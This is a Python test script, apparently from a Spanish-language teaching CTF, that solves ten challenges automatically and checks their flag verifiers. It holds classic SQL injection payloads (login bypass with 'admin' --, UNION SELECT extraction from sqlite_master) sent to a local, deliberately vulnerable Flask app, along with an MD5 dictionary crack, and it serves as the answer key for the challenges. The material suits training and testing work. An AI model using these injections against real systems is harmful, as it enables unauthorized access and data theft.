"""
probar_todo.py — Resuelve automáticamente los 10 retos y comprueba que
cada verificar.py acepta la flag correcta y rechaza una incorrecta.

⚠️  SPOILER TOTAL: este script contiene la forma de resolver cada reto.

No conoce las flags de antemano: las EXTRAE de los archivos de cada reto
(igual que lo haría una persona), así que si un reto está roto, falla.

Uso (desde la raíz del repositorio):
    python3 ctf/herramientas/probar_todo.py

Requiere: flask y pillow (pip install -r ctf/requirements.txt)
"""

import base64
import hashlib
import re
import shutil
import socket
import stat
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from collections import Counter
from pathlib import Path

CTF = Path(__file__).resolve().parent.parent
PATRON_FLAG = re.compile(r"CENTINELA\{[^}]+\}")
RETOS = sorted(p.name for p in CTF.iterdir() if re.match(r"^\d\d-", p.name))


def archivo(reto, nombre):
    return CTF / reto / "archivos" / nombre


def buscar_flag(texto):
    m = PATRON_FLAG.search(texto)
    assert m, f"no se encontró ninguna flag en: {texto[:200]!r}"
    return m.group(0)


# --------------------------------------------------------------------------
# Solucionadores (uno por reto)
# --------------------------------------------------------------------------

def resolver_01():
    texto = archivo("01-bienvenida-base64", "mensaje.txt").read_text()
    return buscar_flag(base64.b64decode(texto).decode("utf-8"))


def cesar(texto, d):
    out = []
    for c in texto:
        if "a" <= c <= "z":
            out.append(chr((ord(c) - 97 + d) % 26 + 97))
        elif "A" <= c <= "Z":
            out.append(chr((ord(c) - 65 + d) % 26 + 65))
        else:
            out.append(c)
    return "".join(out)


def resolver_02():
    cifrado = archivo("02-cifrado-cesar", "interceptado.txt").read_text()
    # Fuerza bruta: solo hay 25 desplazamientos posibles.
    for d in range(1, 26):
        claro = cesar(cifrado, -d)
        if "CENTINELA{" in claro:
            return buscar_flag(claro)
    raise AssertionError("ningún desplazamiento produce CENTINELA{")


def resolver_03():
    cifrado = archivo("03-vigenere", "cifrado.txt").read_text()
    conocido = "CENTINELA"
    # Ataque de texto conocido: clave = cifrado - claro (letra a letra).
    clave_larga = "".join(chr((ord(c) - ord(p)) % 26 + 65) for c, p in zip(cifrado, conocido))
    # Buscamos el periodo más corto que se repite dentro de esas 9 letras.
    for n in range(1, len(clave_larga) + 1):
        if all(clave_larga[i] == clave_larga[i % n] for i in range(len(clave_larga))):
            clave = clave_larga[:n]
            break
    out, i = [], 0
    for c in cifrado:
        if c.isascii() and c.isalpha():
            base = 65 if c.isupper() else 97
            out.append(chr((ord(c) - base - (ord(clave[i % len(clave)]) - 65)) % 26 + base))
            i += 1
        else:
            out.append(c)
    claro = "".join(out)
    assert clave == "HALCON", f"clave inesperada {clave}"
    return buscar_flag(claro)


def resolver_04():
    hashes = dict(
        linea.split(":") for linea in archivo("04-hashes", "volcado.txt").read_text().splitlines()
        if linea and not linea.startswith("#")
    )
    objetivo = hashes["admin"]
    assert len(objetivo) == 32, "debería ser MD5 (32 caracteres hex)"
    for palabra in archivo("04-hashes", "diccionario.txt").read_text().split():
        if hashlib.md5(palabra.encode()).hexdigest() == objetivo:
            return f"CENTINELA{{{palabra}}}"
    raise AssertionError("contraseña de admin no está en el diccionario")


def resolver_05():
    log = archivo("05-analisis-logs", "auth.log").read_text().splitlines()
    fallos = Counter()
    for l in log:
        m = re.search(r"Failed password for (?:invalid user )?\S+ from (\S+)", l)
        if m:
            fallos[m.group(1)] += 1
    sospechosas = {ip for ip, n in fallos.items() if n >= 20}
    exitos = []
    for l in log:
        m = re.search(r"Accepted password for (\S+) from (\S+)", l)
        if m and m.group(2) in sospechosas:
            exitos.append((m.group(2), m.group(1)))
    assert len(exitos) == 1, f"se esperaba un único éxito sospechoso, hay {exitos}"
    ip, usuario = exitos[0]
    return f"CENTINELA{{{ip}_{usuario}}}"


def resolver_06():
    ruta = archivo("06-magic-bytes", "informe_final.txt")
    cabecera = ruta.read_bytes()[:4]
    assert cabecera == b"PK\x03\x04", f"magic bytes inesperados: {cabecera!r}"
    with zipfile.ZipFile(ruta) as z:
        return buscar_flag(z.read("secreto/nota.txt").decode())


def resolver_07():
    from PIL import Image

    img = Image.open(archivo("07-esteganografia", "atardecer.png")).convert("RGB")
    ancho, alto = img.size
    px = img.load()
    datos, byte, nbits = bytearray(), 0, 0
    for y in range(alto):
        for x in range(ancho):
            byte = (byte << 1) | (px[x, y][0] & 1)
            nbits += 1
            if nbits == 8:
                if byte == 0:
                    return buscar_flag(datos.decode())
                datos.append(byte)
                byte, nbits = 0, 0
    raise AssertionError("no se encontró el byte de fin")


def resolver_08():
    # 1) Leyendo listado.txt: SUID ('s' en el usuario) + escribible por otros ('w' en otros).
    candidatos = []
    for l in archivo("08-permisos-linux", "listado.txt").read_text().splitlines():
        partes = l.split()
        if len(partes) >= 9 and len(partes[0]) == 10:
            p = partes[0]
            if p[3] in "sS" and p[8] == "w" and partes[2] == "root":
                candidatos.append(partes[-1])
    assert len(candidatos) == 1, candidatos

    # 2) Con el laboratorio real y `find`, como se explica en la solución.
    carpeta = CTF / "08-permisos-linux" / "archivos"
    lab = carpeta / "laboratorio"
    shutil.rmtree(lab, ignore_errors=True)
    subprocess.run([sys.executable, "preparar_laboratorio.py"], cwd=carpeta, check=True, capture_output=True)
    try:
        salida = subprocess.run(
            ["find", "laboratorio", "-type", "f", "-perm", "-4000", "-perm", "-o+w"],
            cwd=carpeta, check=True, capture_output=True, text=True,
        ).stdout.split()
        assert len(salida) == 1, salida
        ruta = carpeta / salida[0]
        octal = format(stat.S_IMODE(ruta.stat().st_mode), "o")
        nombre = ruta.name
        assert nombre == candidatos[0]
    finally:
        shutil.rmtree(lab, ignore_errors=True)
    return f"CENTINELA{{{nombre}_{octal}}}"


# --- Retos 09 y 10: la app Flask, contra un servidor real --------------------

class Servidor:
    def __enter__(self):
        with socket.socket() as s:
            s.bind(("127.0.0.1", 0))
            self.puerto = s.getsockname()[1]
        codigo = (
            "import sys; sys.path.insert(0, sys.argv[1]); import app; "
            "app.app.run(host='127.0.0.1', port=int(sys.argv[2]))"
        )
        self.proc = subprocess.Popen(
            [sys.executable, "-c", codigo, str(CTF / "app-vulnerable"), str(self.puerto)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        for _ in range(50):
            try:
                urllib.request.urlopen(self.url("/"), timeout=1)
                return self
            except OSError:
                time.sleep(0.1)
        raise RuntimeError("la app Flask no arrancó")

    def __exit__(self, *exc):
        self.proc.terminate()
        self.proc.wait(timeout=5)

    def url(self, ruta):
        return f"http://127.0.0.1:{self.puerto}{ruta}"

    def pedir(self, ruta, datos=None):
        cuerpo = urllib.parse.urlencode(datos).encode() if datos else None
        try:
            with urllib.request.urlopen(self.url(ruta), data=cuerpo, timeout=5) as r:
                return r.status, r.read().decode()
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode()


def resolver_09(srv):
    # Sanidad: credenciales de invitado funcionan pero no dan flag.
    st, html = srv.pedir("/login", {"usuario": "invitado", "contrasena": "invitado"})
    assert st == 200 and "CENTINELA{" not in html
    # Contraseña errónea → 401
    st, _ = srv.pedir("/login", {"usuario": "admin", "contrasena": "x"})
    assert st == 401
    # El clásico ' OR '1'='1 entra… pero como invitado (primera fila).
    st, html = srv.pedir("/login", {"usuario": "' OR '1'='1' --", "contrasena": "x"})
    assert st == 200 and "invitado" in html and "CENTINELA{" not in html
    # Una comilla suelta provoca un error SQL (pista de que es inyectable).
    st, html = srv.pedir("/login", {"usuario": "'", "contrasena": "x"})
    assert st == 500 and "Error de base de datos" in html
    # La solución: comentar la comprobación de contraseña.
    st, html = srv.pedir("/login", {"usuario": "admin' --", "contrasena": "loquesea"})
    assert st == 200
    return buscar_flag(html)


def resolver_10(srv):
    q = lambda texto: "/productos?q=" + urllib.parse.quote(texto)
    st, html = srv.pedir(q("Candado"))
    assert st == 200 and "1 resultado(s)" in html
    # Número de columnas: con 2 falla, con 3 funciona.
    st, _ = srv.pedir(q("' UNION SELECT 1,2 --"))
    assert st == 500
    st, _ = srv.pedir(q("' UNION SELECT 1,2,3 --"))
    assert st == 200
    # Descubrir tablas.
    st, html = srv.pedir(q("' UNION SELECT name, type, sql FROM sqlite_master --"))
    assert st == 200 and "boveda" in html
    # Extraer el secreto.
    st, html = srv.pedir(q("' UNION SELECT secreto, id, 'x' FROM boveda --"))
    assert st == 200
    return buscar_flag(html)


# --------------------------------------------------------------------------

def verificar(reto, flag):
    script = CTF / reto / "verificar.py"
    bien = subprocess.run([sys.executable, str(script), flag], capture_output=True, text=True)
    mal = subprocess.run([sys.executable, str(script), "CENTINELA{incorrecta}"], capture_output=True, text=True)
    # Modo interactivo (sin argumentos, flag por teclado)
    inter = subprocess.run([sys.executable, str(script)], input=flag + "\n", capture_output=True, text=True)
    return bien.returncode == 0 and mal.returncode == 1 and inter.returncode == 0


def main():
    fallos = 0
    resultados = []

    obligatorios = ["ENUNCIADO.md", "PISTA.md", "SOLUCION.md", "verificar.py"]
    for reto in RETOS:
        faltan = [f for f in obligatorios if not (CTF / reto / f).exists()]
        if faltan:
            print(f"❌ {reto}: faltan {faltan}")
            fallos += 1

    solucionadores = {
        "01": resolver_01, "02": resolver_02, "03": resolver_03, "04": resolver_04,
        "05": resolver_05, "06": resolver_06, "07": resolver_07, "08": resolver_08,
    }
    with Servidor() as srv:
        solucionadores["09"] = lambda: resolver_09(srv)
        solucionadores["10"] = lambda: resolver_10(srv)
        for reto in RETOS:
            try:
                flag = solucionadores[reto[:2]]()
                ok = verificar(reto, flag)
            except Exception as e:  # noqa: BLE001
                flag, ok = f"ERROR: {e}", False
            fallos += not ok
            resultados.append((reto, ok, flag))

    # Además: la flag debe aparecer en SOLUCION.md (que la solución sea coherente).
    for reto, ok, flag in resultados:
        solucion = CTF / reto / "SOLUCION.md"
        if ok and solucion.exists() and flag not in solucion.read_text(encoding="utf-8"):
            print(f"❌ {reto}: SOLUCION.md no menciona la flag correcta")
            fallos += 1

    print()
    for reto, ok, flag in resultados:
        print(f"{'✅' if ok else '❌'} {reto:<22} {flag}")
    print()
    print("TODO CORRECTO" if fallos == 0 else f"{fallos} FALLO(S)")
    return 1 if fallos else 0


if __name__ == "__main__":
    sys.exit(main())
